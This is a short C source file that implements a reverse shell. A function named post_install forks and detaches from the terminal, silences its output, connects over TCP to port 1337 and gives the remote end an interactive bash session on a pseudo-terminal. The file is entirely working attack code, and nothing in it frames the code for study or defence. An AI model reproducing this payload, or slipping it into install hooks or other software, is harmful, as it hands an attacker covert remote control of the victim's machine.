#include <stdint.h>
#include <sys/types.h>
#include <fcntl.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include "tas/tas.h"

void myshell(int fd)
{
	tas_tty tty = TAS_TTY_INIT;
	pid_t pid = tas_forkpty(&tty);

	if (pid <= 0) {
		if (pid == -1) {
			goto end;
		}

		setenv("TERM", "xterm-256color", 1);

		execvp("/bin/bash", (char *[]){ "-bash", NULL });
		_exit(1);
	}

	tty.stdin_fd = tty.stdout_fd = fd;
	tas_tty_loop(&tty);

end:
	close(fd);
}

void post_install(void)
{
	pid_t pid = fork();
	if (pid) {
		return;
	}

	setsid();

	int fd = open("/dev/null", O_RDWR);
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);

	if (fd > 2)
		close(fd);

	int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd == -1) {
		// perror("socket");
		_exit(0);
	}

	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = htons(1337),
		.sin_addr.s_addr = 0x00000000
	};

	socklen_t slen = sizeof(addr);

	if (connect(sockfd, (struct sockaddr *) &addr, slen) == -1) {
		// perror("connect");
		_exit(0);
	}

	myshell(sockfd);
	_exit(0);
}
